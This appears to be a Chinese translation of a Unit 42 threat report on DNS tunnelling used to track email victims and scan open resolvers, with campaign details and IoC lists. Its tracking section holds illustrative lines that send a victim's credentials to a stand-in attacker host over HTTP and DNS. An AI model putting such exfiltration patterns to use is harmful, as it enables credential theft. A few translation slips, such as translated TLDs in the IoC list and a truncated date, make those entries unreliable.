翻译：  
<https://unit42.paloaltonetworks.com/three-dns-tunneling-campaigns/>

概述
==

本文介绍了域名系统 (DNS) 隧道在野外的新应用的案例研究。这些技术不仅仅用于简单的命令和控制(C2)和虚拟专用网络(VPN)目的的DNS隧道。它们的应用范围已经超出了最初设计的用途。

恶意行为者有时会使用 DNS 隧道作为隐蔽通信通道。这使得他们能够绕过传统的网络防火墙，隐藏 C2 流量并从传统检测方法中窃取数据。

然而，我们最近发现了三个活动，其中 DNS 隧道被用于传统 C2 或 VPN 以外的目的。其目的是扫描和跟踪。在扫描的情况下，攻击者使用 DNS 隧道来扫描受害者的网络基础设施并收集对未来攻击有用的信息。为了进行跟踪，攻击者使用 DNS 隧道技术来跟踪恶意电子邮件的传送并监控内容传送网络 (CDN) 的使用情况。

本文提供了一个详细的案例研究，揭示了攻击者如何使用 DNS 隧道进行扫描和跟踪。我们希望本文的介绍能够提高人们对这些新用例的认识，并提供进一步的见解，帮助安全专业人员更好地保护他们的网络。

DNS 隧道
======

DNS 隧道将信息嵌入 DNS 请求和响应中。这样做允许受攻击者妥协的主机通过 DNS 流量与其控制下的名称服务器进行通信。下图 1 显示了一个示例。  
DNS 隧道的典型用例涉及以下步骤：

- 攻击者首先注册一个域（例如， male\[.\]site ）。接下来，设置使用 DNS 隧道作为通信通道的 C2 服务器。攻击者可以通过多种方式建立 C2 通道，包括利用Cobalt Strike 。
- 攻击者编写、开发或获取作为客户端与服务器通信的恶意软件，然后将该恶意软件传递到受感染的客户端计算机。
- 受感染的机器通常位于防火墙后面。这意味着它无法直接与攻击者的服务器通信。然而，该恶意软件能够对恶意站点子域内的数据进行编码，并对 DNS 解析器执行 DNS 查询（图 1）。
- 用于隧道的完全限定域名 (FQDN) 应该是唯一的，因此 DNS 解析器无法在其缓存中找到相应的记录。这会导致解析器递归查询攻击者下的域的根域名服务器、顶级域 (TLD) 域名服务器和权威域名服务器。
- 攻击者可以解码 DNS 流量以检索数据并操纵 DNS 响应以将恶意数据窃取到客户端。

| ![image.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-4e3348f91424089e5a316aecd4bc99f8ed7ce9cf.png) |
|---|
| 图 1.通过 DNS 隧道进行数据泄露和渗透的概述。 |

DNS 隧道是如何隐藏的？
=============

DNS 隧道被三个因素隐藏：

- 传统防火墙可以拒绝未经授权的流量。然而，用户数据报协议 (UDP) 端口 53 上的 DNS 流量非常普遍，防火墙和其他网络安全措施通常允许这种流量。
- DNS 隧道使用 DNS 协议的实现，并通过受感染客户端和攻击者服务器之间的逻辑通道执行。这意味着客户端计算机不直接与攻击者的服务器通信。这进一步有助于隐藏。
- 攻击者通常使用自己定制的方法对他们在数据外泄或渗透过程中发送的数据进行编码，从而使数据隐藏在看似合法的 DNS 流量中。

攻击者如何使用 DNS 隧道
==============

使用 DNS 隧道进行 C2 允许攻击者建立隐秘且有弹性的通信通道，使攻击者更容易执行数据外泄、渗透和其他恶意活动。DarkHydrus、OilRig、xHunt、SUNBURST和Decoy Dog等著名活动都利用 DNS 隧道进行 C2。

攻击者使用的 DNS 记录类型包括：

- IPv4（A）
- IPv6（AAAA）
- 邮件交换 (MX)
- 别名记录 (CNAME)
- 文本 (TXT)

一些 VPN 供应商可能会使用 DNS 隧道来绕过防火墙来绕过互联网审查或网络服务费用。  
除了 C2 和 VPN 目的之外，攻击者还可能使用 DNS 隧道进行跟踪和扫描目的。在最近的隧道挖掘活动中也观察到了这种用法。

- 用于跟踪目的的 DNS 隧道  
    攻击者可以使用 DNS 隧道来跟踪与垃圾邮件、网络钓鱼和广告内容相关的受害者行为。攻击者通过向受害者分发恶意域并将受害者的身份信息编码在该域的子域的有效负载中来实现跟踪。
- 用于扫描目的的 DNS 隧道  
    攻击者可能会使用欺骗性的源 IP 地址并将 IP 地址和时间戳编码在隧道有效负载中来扫描您的网络基础设施。然后，攻击者可以发现开放解析器并利用这些解析器中的漏洞来执行 DNS 攻击。这可能会导致恶意重定向和拒绝服务 (DoS)。

为了更好地理解这两个新用例，以下部分描述了我们观察到的使用 DNS 隧道进行跟踪和扫描的活动。

用于跟踪目的的 DNS 隧道
==============

在传统的 C2 通信中，黑客通常会利用一种叫做C2通信的方法来远程控制受害者的计算机。在这种方法中，黑客会把受害者的行为数据（比如访问过的网页、输入的密码等）隐藏在一个网址里，然后通过网络把这个网址发送到他们控制的服务器。这种方式看起来就像是正常的网络活动，所以不容易被发现。  
**示例：**  
受害者访问了一个网页，其URL是：

```html
http://example.com/page
```

恶意软件捕获了这个URL，并记录了受害者在页面上的键盘输入，比如：

```html
username=xz&password=12345
```

然后，恶意软件将这些数据编码后嵌入到新的URL中，例如：

```html
http://malicious-server.com/track?data=http%3A%2F%2Fexample.com%2Fpage%26username%3Dxz%26password%3D12345
```

在这个示例中，攻击者通过HTTP请求将受害者访问的URL和键盘输入数据发送到自己的C2服务器。

在 DNS 隧道的情况下，黑客使用DNS隧道技术。他们会把受害者的行为数据编码后放在DNS请求的子域名部分，然后通过DNS流量把这些数据发送到他们的服务器。这种方法同样不容易被察觉，因为DNS流量通常不会被严格监控。  
**示例：**  
受害者的行为数据被编码成：

```html
dXNlcm5hbWU9eHomcGFzc3dvcmQ9MTIzNDUK
```

这个字符串是将原始数据username=xz&amp;password=12345进行Base64编码的结果。

然后，恶意软件构建一个伪装的DNS查询，将编码后的数据嵌入到子域中：

```html
dXNlcm5hbWU9eHomcGFzc3dvcmQ9MTIzNDUK.malicious-server.com
```

当DNS查询这个子域时，包含的数据会被发送到攻击者控制的DNS服务器。攻击者的DNS服务器会解析这个查询，从中提取出隐藏的数据。

当 DNS 隧道用于此目的时，攻击者的恶意软件会将有关特定用户及其操作的信息嵌入到 DNS 查询的独特子域中。该子域是隧道有效负载，FQDN 的 DNS 查询使用攻击者控制下的域。

攻击者控制的域的权威名称服务器接收此 DNS 查询。该攻击者下的名称服务器存储该域的所有 DNS 查询。这些 DNS 查询的独特子域和时间戳提供了受害者活动的日志。这种跟踪不仅限于单个受害者；这种方法允许攻击者跟踪活动中的多个受害者。

TrkCdn DNS 隧道攻击活动
=================

由于用于 DNS 隧道的域名的特性，我们将此活动命名为“TrkCdn”。根据我们的分析，我们认为 TrkCdn 活动中使用的 DNS 隧道技术旨在跟踪受害者的电子邮件内容的互动。我们的数据显示，攻击者的目标是 731 名潜在受害者。该活动使用 75 个 IP 地址作为名称服务器，解析了攻击者的 658 个域名。

每个域仅使用一个名称服务器 IP 地址，但一个名称服务器 IP 地址最多可以为 123 个域提供服务。这些域对其子域使用相同的 DNS 配置和相同的编码方法。攻击者在.com或.info TLD 下注册所有域名，并通过组合两个或三个原始单词来设置域名。这是攻击者用来逃避域生成算法 (DGA) 检测的技术。

下面列出了其中一些域。

- simitor\[.\]com
- vibnere\[.\]com
- edrefo\[.\]com
- pordasa\[.\]info
- vitrfar\[.\]info
- frotel\[.\]info

下面的表 1 显示了这些域的列表以及示例 FQDN、域名服务器、域名服务器 IP 地址和注册日期。我们将此活动命名为 TrkCdn，因为它仅在 trk 子域下使用 DNS 隧道，并且在cdn子域下有 CNAME 记录。

| 域名 | 示例 FQDN | 域名服务器 | 域名服务器ip地址 | 注册日期 |
|---|---|---|---|---|
| simitor\[.\]com | 04b16bbbf91be3e2fee2c83151131cf5.trk.simitor\[.\]com | ns1.simitor\[.\]com | 193.9.114\[.\]43 | 6-Jul-2 |
|  |  | ns2.simitor\[.\]com |  |  |
| vibnere\[.\]com | a8fc70b86e828ffed0f6b3408d30a037.trk.vibnere\[.\]com | ns1.vibnere\[.\]com | 193.9.114\[.\]43 | 14-Jun-23 |
|  |  | ns2.vibnere\[.\]com |  |  |
| edrefo\[.\]com | 6e4ae1209a2afe123636f6074c19745d.trk.edrefo\[.\]com | ns1.edrefo\[.\]com | 193.9.114\[.\]43 | 26-Jul-23 |
|  |  | ns2.edrefo\[.\]com |  |  |
| pordasa\[.\]info | 2c0b9017cf55630f1095ff42d9717732.trk.pordasa\[.\]info | ns1.pordasa\[.\]info | 172.234.25\[.\]151 | Oct. 11, 2022 |
|  |  | ns2.pordasa\[.\]info |  |  |
| vitrfar\[.\]info | 0fa17586a20ef2adf2f927c78ebaeca3.trk.vitrfar\[.\]info | ns1.vitrfar\[.\]info | 172.234.25\[.\]151 | Nov. 21, 2022 |
|  |  | ns2.vitrfar\[.\]info |  |  |
| frotel\[.\]info | 50e5927056538d5087816be6852397f6.trk.frotel\[.\]info | ns1.frotel\[.\]info | 172.234.25\[.\]151 | Nov. 21, 2022 |
|  |  | ns2.frotel\[.\]info |  |  |

表1. TrkCdn活动中使用的部分域。

追踪机制
====

我们认为 TrkCdn 活动中使用的 DNS 隧道技术旨在跟踪受害者的电子邮件内容交换。对simitor\[.\]com的 DNS 流量的分析揭示了攻击者是如何实现这一目标的。

在这里，我们只展示了在该隧道领域中使用的与跟踪相关的 DNS 配置。193.9.114\[.\]43 是根域、名称服务器和 cdn.simitor\[.\]com 相同的 IP 地址。这种方法是在隧道领域中经常看到的模式。原因是攻击者需要尽可能降低攻击成本来建立自己的名称服务器。因此，在主机和名称服务器上都仅使用单个 IP 地址是很常见的做法。

所有\*.trk.simitor\[.\]com将被重定向到cdn.simitor\[.\]com 。在这种情况下，将使用通配符 DNS 记录，如下所示。

```bash
simitor[.]com A 193.9.114[.]43
ns1.simitor[.]com A 193.9.114[.]43
ns2.simitor[.]com A 193.9.114[.]43
cdn.simitor[.]com A 193.9.114[.]43
*.trk.simitor[.]com CNAME cdn.simitor[.]com
```

对于 TrkCdn 活动，MD5 哈希值代表 DNS 流量中的电子邮件地址。这些 MD5 值是隧道有效负载 DNS 查询的子域。例如，电子邮件地址unit42@not-a-real-domain\[.\]com 的MD5 值为4e09ef9806fb9af448a5efcd60395815。在这种情况下，隧道有效负载的 DNS 查询的 FQDN将为4e09ef9806fb9af448a5efcd60395815.trk.simitor\[.\]com 。

针对这些 FQDN 的 DNS 查询可以作为跟踪威胁行为者发送的电子邮件的机制。例如，当受害者打开其中一封电子邮件时，嵌入的内容可能会自动生成 DNS 查询，或者受害者可能会点击电子邮件中的链接。无论何种触发因素，当受感染的主机生成 FQDN 的 DNS 查询时，DNS 解析器都会连接到 FQDN 的权威名称服务器 IP 地址。由于通配符配置，受害者的 DNS 解析器将得到以下结果：

```bash
4e09ef9806fb9af448a5efcd60395815.trk.simitor[.]com. 3600 IN CNAME cdn.simitor[.]com.
cdn.simitor[.]com. 555 IN A 193.9.114[.]43
```

因此，尽管每个目标受害者的 FQDN 不同，但它们都被重定向到cdn.simitor\[.\]com使用的相同 IP 地址。该权威名称服务器返回的 DNS 结果指向攻击者控制下的服务器，该服务器提供攻击者控制的内容。这里提供的内容包括广告、垃圾邮件、网络钓鱼等。

要跟踪它，攻击者可以简单地从权威名称服务器查询 DNS 日志，并将有效负载与电子邮件地址的哈希值进行比较。这使得攻击者能够看到特定受害者何时打开电子邮件或点击链接，从而监控活动的表现。

例如，下面的图 2 显示了 TrkCdn 活动中 FQDN 的 DNS 查询的累积分布函数 (CDF)。此图显示 0 到 30 天内 TrkCdn FQDN 的 DNS 查询总数的百分比。该图显示，大约 80% 的受害者仅查看一次活动电子邮件，另外 10% 的受害者在大约一周内再次查看该邮件。攻击者还可以以类似的方式从权威名称服务器查看此 FQDN 数据。

| ![image.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-144ea192e23d2a2e7534110460225d9d6d63b2f9.png) |
|---|
| 图 2. TrkCdn 活动中 FQDN 持续天数的累积分布函数 (CDF) |

域生命周期
=====

在检查了较旧的域pordasa\[.\]info后，我们得出结论，TrkCdn 域生命周期经历了四个不同的阶段。这四个阶段是：

- 潜伏期（2-12周）  
    域名注册后，攻击者只配置DNS，不执行其他操作。这试图避免检测到新注册的恶意域。
- 活跃期（2-3周）  
    攻击者主动向每个受害者的电子邮件地址分发数千个 FQDN。
- 随访期（9-11个月）  
    受害者查询 FQDN，攻击者检索 DNS 日志以跟踪受害者的活动。
- 退休期（注册后1年）  
    攻击者通常会在一年后停止更新域名注册。

下面的图 3显示了pordasa\[.\]info生命周期的示例。攻击者使用此域进行 DNS 隧道类型跟踪。该域名于 2022 年 10 月 12 日首次注册。

| ![image.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-011afec88b0b844b0a141b02cf110f417d5abd7f.png) |
|---|
| 图 3. pordasa\[.\]info域的生命周期 |

TrkCdn 的持久性
===========

我们发现攻击者使用新的 IP 地址向与 TrkCdn 活动相关的权威域名服务器注册新域名，直至 2024 年 2 月。攻击者在2020年10月19日至2024年1月2日期间注册了这些域名。我们分析不同 IP 地址的域名注册时间表和域名首次使用情况。

图 4 跟踪了与 49 个 IP 地址关联的 TrkCdn 域的使用情况。如图 4 所示，TrkCdn 权威名称服务器使用的大部分 IP 地址位于146.70.0\[.\]0/16或185.121.0\[.\]0/16

| ![image.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-b22c43f61a5cde4e93d95457164d9573b3d387ff.png) |
|---|
| 图4. TrkCdn域名注册和在不同IP地址上的使用时间线 |

SpamTracker DNS 隧道攻击活动
======================

我们的第二个示例是一项使用DNS隧道追踪垃圾邮件投递的活动。由于这项活动使用DNS隧道进行垃圾邮件跟踪，我们将此活动命名为“SpamTracker”。

该活动使用类似于 TrkCdn 活动的跟踪机制。该活动与 44 个隧道域相关，其权威名称服务器 IP 地址为35.75.233\[.\]210 。

这些域名使用了与 TrkCdn 活动中使用的相同的 DGA 命名和子域名编码方法。这些域的 A 记录的名称服务器托管在103.8.88\[.\]64/27子网中的 IP 地址上。该活动始于日本，主要针对教育机构。

此活动使用电子邮件和网站链接来传递基于以下主题的垃圾邮件和网络钓鱼内容：

- 算命服务
- 关于假包裹递送的更新
- 要求兼职
- 终身免费物品

图 5 显示了这些电子邮件的示例。此活动的目标是诱骗受害者单击威胁行为者作为有效负载隐藏在子域中的链接。

| ![8c64321d590be0ae58d726d23792ea8.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-a1a96cb918d1e0e7cb60f4e39020b71e431b57b7.png) |
|---|
| 图 5. SpamTracker 活动中使用的电子邮件示例（及其英文，中文翻译） |

受害者被重定向到包含欺诈信息的网站，如图 6 所示的算命服务。

| ![image.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-4d4c462ebb649eb8c31b531b645394e44e0fa4b4.png) |
|---|
| 图 6. SpamTracker 活动中的虚假算命网站 |

表2列出了此次活动的六个域，以及FQDNs的示例、域名服务器、域名服务器IP地址和注册时间。

| 域名 | 示例 FQDN | 域名服务器 | 域名服务器ip地址 | 注册日期 |
|---|---|---|---|---|
| wzbhk2ccghtshr\[.\]com | 21pwt2otx07d3et.wzbhk2ccghtshr\[.\]com | ns01.wzbhk2ccghtshr\[.\]com | 35.75.233\[.\]210 | 2023 年 5 月 15 日 |
|  |  | ns02.wzbhk2ccghtshr\[.\]com |  |  |
| epyujbhfhbs35j\[.\]com | y0vkmu2eh896he7.epyujbhfhbs35j\[.\]com | ns01.epyujbhfhbs35j\[.\]com | 35.75.233\[.\]210 | 2023 年 5 月 15 日 |
|  |  | ns02.epyujbhfhbs35j\[.\]com |  |  |
| 8egub9e7s6cz7n\[.\]com | q8udswcmvznk34q.8egub9e7s6cz7n\[.\]com | ns01.8egub9e7s6cz7n\[.\]com | 35.75.233\[.\]210 | 2023 年 5 月 15 日 |
|  |  | ns02.8egub9e7s6cz7n\[.\]com |  |  |
| hjmpfsamfkj5m5\[.\]com | run0ibnpq8r34dj.hjmpfsamfkj5m5\[.\]com | ns01.hjmpfsamfkj5m5\[.\]com | 35.75.233\[.\]210 | 2023 年 5 月 15 日 |
|  |  | ns02.hjmpfsamfkj5m5\[.\]com |  |  |
| uxjxfg2ui8k5zk\[.\]com | vfct3phbmc8qsx2.uxjxfg2ui8k5zk\[.\]com | ns01.uxjxfg2ui8k5zk\[.\]com | 35.75.233\[.\]210 | 2023 年 5 月 15 日 |
|  |  | ns02.uxjxfg2ui8k5zk\[.\]com |  |  |
| cgb488dixfxjw7\[.\]com | htujn1rhh3553tc.cgb488dixfxjw7\[.\]com | ns01.cgb488dixfxjw7\[.\]com | 35.75.233\[.\]210 | 2023 年 5 月 15 日 |
|  |  | ns02.cgb488dixfxjw7\[.\]com |  |  |
| 表 2. SpamTracker 活动中使用的域列表 |  |  |  |  |

用于扫描目的的 DNS 隧道
==============

网络扫描寻找网络基础设施中的漏洞，通常是网络攻击的第一步。然而，用于网络扫描的 DNS 隧道的用例尚未得到充分研究。因此，寻找扫描 DNS 隧道活动的应用程序可以尽早预防网络攻击并减轻潜在损害。

SecShow DNS 隧道活动
================

我们发现了一项新的攻击活动，威胁行为者利用隧道技术定期扫描受害者的网络基础设施，然后通常执行反射攻击。他们的恶意行为包括以下内容：

- 查找开放解析器
- 测试解析器延迟
- 利用解析器漏洞
- 获取生存时间 (TTL) 信息

此活动通常针对开放解析器。由此，不少受害者分布在教育、高科技、政府部门。这是因为开放解析器在这些领域很常见。该活动包括三个域，并利用各个子域来实现不同的网络扫描。

表 3 显示了这三个域及其 FQDN、域名服务器、域名服务器 IP 地址和注册日期的示例。这些域共享一个公共名称服务器， IP 地址为202.112.47\[.\]45 。我们根据攻击者使用的域名将此活动命名为“SecShow”。

| 域名 | 示例 FQDN | 域名服务器 | 域名服务器ip地址 | 注册日期 |
|---|---|---|---|---|
| secshow\[.\]net | 6a134b4f-1.c.secshow\[.\]net | ns1.c.secshow\[.\]net. | 202.112.47\[.\]45 | 27-Jul-23 |
|  |  | ns2.c.secshow\[.\]net. |  |  |
| secshow\[.\]online | 1-103-170-192-121-103-170-192-9.f.secshow\[.\]online | ns.secshow\[.\]online. | 202.112.47\[.\]45 | Nov. 5, 2023 |
| secdns\[.\]site | 0-53aa2a46-202401201-ans-dnssec.l-test.secdns\[.\]site | ns1.l-test.secdns\[.\]site. | 202.112.47\[.\]45 | Dec. 13, 2023 |
|  |  | ns2.l-test.secdns\[.\]site. |  |  |
| 表 3. SecShow 活动中使用的域列表 |  |  |  |  |

使用 SecShow 隧道
=============

SecShow根据扫描的目的使用不同的子域值。以下四个用例演示了攻击者如何扫描您的网络。

**用例 1： bc2874fb-1.c.secshow\[.\]net**

在此 FQDN 中，bc2874fb是十六进制编码的IP 地址188.40.116\[.\]251 。 -1是一个计数器，使 FQDN 唯一。名称服务器域是c.secshow\[.\]net。

攻击者首先欺骗一个随机源 IP 地址（例如188.40.116\[.\]251 ），并将其用作解析bc2874fb-1.c.secshow\[.\]net编码的 FQDN ( c.secshow\[.\]net）接收DNS查询并获取连接解析器的IP地址和查询中使用的编码源IP地址。

攻击者使用不同的欺骗性 IP 地址重复此过程，以发现网络中的开放解析器以及这些开放解析器所服务的 IP 地址。这可能是 DNS 欺骗、DNS 缓存投毒或 DNS 放大攻击的第一步。

**用例 2： 20240212190003.bailiwick.secshow\[.\]net**

这种类型的 FQDN 仅在每周一 19:00:03 UTC 出现。负载包含一个时间戳（例如，2024 年 2 月 12 日 19:00:03 UTC），即生成此 FQDN 的时间。

攻击者欺骗源 IP 地址并从解析器 IP 地址查询此 FQDN。攻击者可以执行以下活动：

- 测试此解析器的查询延迟
- 检查他们的域名是否被阻止，并且查询是否被转发到sinkhole服务器
- 利用这个解析器的漏洞

攻击者通过分析权威名称服务器日志来实现前两个目标。为了利用解析器漏洞，对此查询的响应包括另一个域的 A 记录。

```bash
20240212190003.bailiwick.secshow[.]net. 3600 IN A 202.112.47[.]45
afusdnfysbsf[.]com. 3600 IN A 202.112.47[.]45
```

在上面的代码中，afusdnfysbsf\[.\]com是一个被禁用的恶意域。不过，该记录可以缓存在解析器中。因此，攻击者可能会尝试利用旧软件版本中的解析器缓存漏洞（例如CVE-2012-1033漏洞）来防止域名失效。

**用例 3：1-103-170-192-121-103-170-192-9.h.secshow\[.\]net**

有效负载以计数器填充 1 开始，后跟两个 IP 地址：103.170.192\[.\]121和103.170.192\[.\]9。前者是欺骗的源IP地址，后者是解析器的目的IP地址。

此 FQDN 类型类似于用例 1。但是，此 FQDN 的 A 记录是一个随机 IP 地址，会根据查询尝试而变化，并且其 TTL 很长，为 86400。可以利用此功能执行以下活动：

- DNS 放大 DDoS（分布式拒绝服务）攻击
- DNS缓存投毒攻击
- 资源耗尽攻击

**用例 4： 0-53ea2a3a-202401201-ans-dnssec.l-test.secdns\[.\]site**

有效负载以预填充0开始，然后是十六进制编码的 IP 地址 ( 53ea2a3a )、date ( 20240120 ) 和后填充 ( 1 )。据观察，攻击者使用此类 FQDN 来获取以下信息：

- 最大/最小 TTL
- 暂停
- 查询速度信息

这些是针对Ghost 域名和Phoenix 域名 \[PDF\]等 DNS 威胁的有用信息。

缓解措施
====

我们建议采取以下措施来减少 DNS 解析器的攻击面。  
管理解析器服务范围并仅接受必要的查询  
及时更新解析器软件版本，防止Nday漏洞

结论
==

DNS隧道技术可以被对手利用来执行通常与DNS隧道无关的各种操作。尽管传统上认为隧道用于C2和VPN目的，但我们还发现攻击者可以将DNS隧道作为追踪受害者活动和网络扫描的工具。

IoC
===

用于 DNS 隧道的域
-----------

85hsyad6i2ngzp\[.\]com  
8egub9e7s6cz7n\[.\]com  
8jtuazcr548ajj\[.\]com  
anrad9i7fb2twm\[.\]com  
aucxjd8rrzh7xf\[.\]com  
b5ba24k6xhxn7b\[.\]com  
cgb488dixfxjw7\[.\]com  
d6zeh4und3yjt9\[.\]com  
epyujbhfhbs35j\[.\]com  
hHMk9ixaw9p3ec\[.\]com  
hjmpfsamfkj5m5\[.\]com  
iszedim8xredu2\[.\]com  
npknraafbisrs7\[.\]com  
patycyfswg33nh\[.\]com  
rhctiz9xijd4yc\[.\]com  
sn9jxsrp23x63a\[.\]com  
swh9cpz2xntuge\[.\]com  
tp7djzjtcs6gm6\[.\]com  
uxjxfg2ui8k5zk\[.\]com  
wzbhk2ccghtshr\[.\]com  
y43dkbzwar7cdt\[.\]com  
ydxpwzhidexgny\[.\]com  
z54zspih9h5588\[.\]com  
3yfr6hh9dd3\[.\]com  
4bs6hkaysxa\[.\]com  
66tye9kcnxi\[.\]com  
8kk68biiiitj\[.\]com  
93dhmp7ipsp\[.\]com  
api536yepwj\[.\]com  
bb62sbtk3yi\[.\]com  
cytceitft8g\[.\]com  
dipgprjp8uu\[.\]com  
ege6wf76eyp\[.\]com  
f6kf5inmfmj\[.\]com  
f6ywh2ud89u\[.\]com  
h82c3stb3k5\[.\]com  
hwa85y4icf5\[.\]com  
ifjh5asi25f\[.\]com  
m9y6dte7b9i\[.\]com  
n98erejcf9t\[.\]com  
rz53par3ux2\[.\]com  
szd4hw4xdaj\[.\]com  
wj9ii6rx7yd\[.\]com  
wk7ckgiuc6i\[.\]com  
secshow\[.\]net  
secshow\[.\]在线  
secdns\[.\]站点

与此活动关联的 IP 地址
-------------

35.75.233\[.\]210  
202.112.47\[.\]45